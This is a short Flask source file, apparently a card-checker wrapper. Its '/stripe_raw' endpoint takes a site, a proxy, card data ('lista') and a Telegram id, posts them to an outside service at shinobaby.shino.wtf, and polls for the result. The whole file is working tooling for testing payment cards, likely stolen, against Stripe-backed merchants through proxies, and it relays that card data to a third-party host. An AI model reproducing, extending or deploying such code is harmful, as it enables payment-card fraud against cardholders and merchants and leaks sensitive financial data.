from flask import Flask, request, jsonify
import httpx
import time
import os

app = Flask(__name__)

@app.route('/')
def home():
    return 'OK'

@app.route('/stripe_raw', methods=['GET'])
def stripe_raw():
    site = request.args.get('site', '')
    proxy = request.args.get('proxy', '')
    card = request.args.get('card', '')
    tgid = request.args.get('tgid', '')

    if not site or not proxy or not card:
        return jsonify({"error": "Missing required parameter."}), 400

    postData = {
        "data": {
            "site": site,
            "lista": card,
            "sec": proxy,
            "tgid": tgid
        },
        "speed_mode": "slow"
    }

    try:
        with httpx.Client(timeout=20) as client:
            r = client.post("https://shinobaby.shino.wtf/stripe", json=postData)
            resp = r.json()
    except Exception as e:
        return jsonify({"error": "API POST error", "detail": str(e)}), 500

    if resp.get("status") == "processing":
        status_url = "https://shinobaby.shino.wtf" + resp["check_status_url"]
        for i in range(15):
            time.sleep(5)
            try:
                with httpx.Client(timeout=20) as client:
                    poll = client.get(status_url)
                    result = poll.json()
            except Exception as e:
                return jsonify({"error": "API polling error", "detail": str(e)}), 500

            if result.get("status") == "completed":
                return jsonify(result)
            elif i == 14:
                return jsonify({"error": "Timed out waiting for result."}), 504
    else:
        return jsonify({"error": "API error", "resp": resp}), 502

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
